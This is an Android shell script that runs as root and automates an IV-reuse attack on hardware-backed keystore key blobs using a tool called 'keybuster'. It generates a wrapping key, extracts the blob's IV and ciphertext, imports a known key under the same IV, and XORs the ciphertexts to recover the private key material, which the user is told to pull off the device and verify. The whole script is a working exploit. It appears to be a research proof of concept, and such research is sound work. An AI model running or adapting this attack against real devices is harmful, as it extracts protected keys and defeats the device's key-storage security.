#!/system/bin/sh

set -e
cd /data/local/tmp
chmod +x ./keybuster

if [ ! -f "rsa-4096-private-key.p8" ]; then
    echo "must copy rsa-4096-private-key.p8 to /data/local/tmp"
    exit 1
fi

# this script should run on the device as root
# adb shell
# su

echo "Attack log: $(realpath attack.log)"

sep=$(printf "%100s")

echo -e ${sep// /-}

echo -n "1. Generating RSA wrapping key as v15 ekey blob... (wait for it) "

# generate the wrapping key as v15 (can also specify app_id and app_data with -i or -d)
./keybuster -c generate -e wrapping_key --algorithm rsa --key-size 4096 --purpose wrap_key --padding oaep --digest sha256 --enc-ver 15 2&>> attack.log

echo "done"

# if you wish to verify the correctness of the blob:
# ./keybuster -c get_chars -e wrapping_key

echo -e ${sep// /-}

echo -n "2. Extract the IV and encrypted ASN1 of the ekey blob... "

# extract the IV and encrypted ASN1 of the key (iv-wrapping_key and encrypted-wrapping_key will be created)
./keybuster -c parse_asn1 -e wrapping_key 2&>> attack.log

echo "done"

echo -e ${sep// /-}

echo -n "3. reuse the IV of the target blob to import a known key (must be larger)... "

# reuse the IV of the target blob to import a known key (must be larger)
./keybuster -c import -e known -p rsa-4096-private-key.p8 --algorithm rsa --key-size 4096 --purpose wrap_key --padding oaep --digest sha256 --iv iv-wrapping_key --enc-ver 15 2&>> attack.log

echo "done"

echo -e ${sep// /-}

echo -n "4. perform the IV reuse attack to recover the private key material of wrapping key... "

# xor the encrypted key material of the target blob with the encrypted key material of the known key and with the known plaintext
./keybuster -c attack -p rsa-4096-private-key.p8 -e encrypted-known -s encrypted-wrapping_key -o recovered-wrapping_key 2&>> attack.log

echo "done"

echo -e ${sep// /-}

echo 'On your computer, download the recovered key using "adb pull /data/local/tmp/recovered-wrapping_key"'
echo 'then verify it with "openssl rsa -inform DER -in recovered-wrapping_key -check -text"'
